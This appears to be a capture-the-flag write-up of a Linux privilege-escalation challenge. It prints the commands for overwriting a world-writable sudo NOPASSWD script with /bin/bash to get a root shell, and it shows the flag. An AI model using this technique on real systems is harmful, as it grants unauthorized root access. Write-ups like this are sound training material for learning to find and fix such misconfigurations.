Event: NCA CTF  
Category: #Pentest 

---

## ğŸ“Œ Challenge Information

- Points: 100
    
- Difficulty: Easy
    
- Credentials (if provided):
    
    - Username: `ctfplayer`
        
    - Password: `ctfplayer`
        

---

## ğŸ“ Challenge Description

You are given access to a Linux system as a normal user. There is a SUDO-enabled script (`/opt/script.sh`) which can be run without a password. Exploit this to escalate privileges and retrieve the root flag.

---

# ğŸ” Initial Enumeration

### Step 1 â€“ Basic Check

```bash
ls
```

Output: (empty)

### Step 2 â€“ Check Root and System Directories

```bash
ls /
```

Output: `bin dev etc home lib media mnt opt proc root run sbin srv sys tmp usr var`

### Step 3 â€“ Check Sudo Permissions

```bash
sudo -l
```

Output:

```
User ctfplayer may run the following commands on this host:
    (ALL) NOPASSWD: /opt/script.sh
```

### Step 4 â€“ Inspect the Script

```bash
cat /opt/script.sh
```

Output:

```bash
#!/bin/bash
LOG_FILE="/home/ctfplayer/cleanup.log"
TARGET_DIR="/tmp"

echo "[*] Starting routine cleanup..." >> "$LOG_FILE"
find "$TARGET_DIR" -type f -mtime +1 -exec rm -f {} \; 2>/dev/null
chmod -R 755 /home/ctfplayer 2>/dev/null
echo "[*] Cleanup completed successfully." >> "$LOG_FILE"
```

---

## ğŸ‘€ Observations

- `/opt/script.sh` is writable by the user (`-rw-rw-rwx`), which is unusual for a root-owned script.
    
- The script can be run via `sudo` without a password.
    
- This creates a **classic writable script privilege escalation scenario**.
    

---

# ğŸš§ Problem Identified

Main trick:

- **Writable SUDO script**: The user can overwrite `/opt/script.sh` with arbitrary commands.
    
- **SUDO without password** allows root execution of the script.
    

---

# ğŸ›  Exploitation / Solution

## Method Used

1. Overwrite the script to launch a root shell:
    

```bash
echo '/bin/bash' > /opt/script.sh
```

2. Run it via sudo to escalate privileges:
    

```bash
sudo /opt/script.sh
```

Explanation:

- When executed with `sudo`, the script runs as root.
    
- By replacing it with `/bin/bash`, a **root shell** is spawned immediately.
    

---

## Alternative Method (If Any)

- Could have added a command to append or read `/root/flag.txt` directly instead of spawning a shell.
    

---

# ğŸ“¤ Command Used to Retrieve the Flag

```bash
cd /root
cat flag.txt
```

Output:

```
NCA{600d_7uck_m4t3s_oN_Fu7ur3_3sca7a7i0n_3b7f23f18052}
```

---

# ğŸš© Final Flag

```
NCA{600d_7uck_m4t3s_oN_Fu7ur3_3sca7a7i0n_3b7f23f18052}
```

---

# ğŸ§  Key Takeaways

- Writable SUDO scripts are **highly dangerous** and can lead to full root compromise.
    
- Always check file permissions on SUDO-enabled binaries/scripts.
    
- Minimal enumeration can save timeâ€”sometimes just `sudo -l` and `ls -l` are enough.
    

---

# ğŸ“š Skills Practiced

- Linux Enumeration
    
- SUDO Permission Analysis
    
- File Permissions Understanding
    
- Privilege Escalation via Writable Scripts
    
- Root Shell Exploitation
    

---

# ğŸ Personal Reflection

Next time, I would immediately check `sudo -l` and script permissions, instead of running lengthy enumeration commands. Identifying **writable scripts under sudo** is often the fastest path to the root flag.

---

If you want, I can also **make a super compact â€œCTF Cheatsheet versionâ€** of this write-up for quick notes that fits in one page. Do you want me to do that?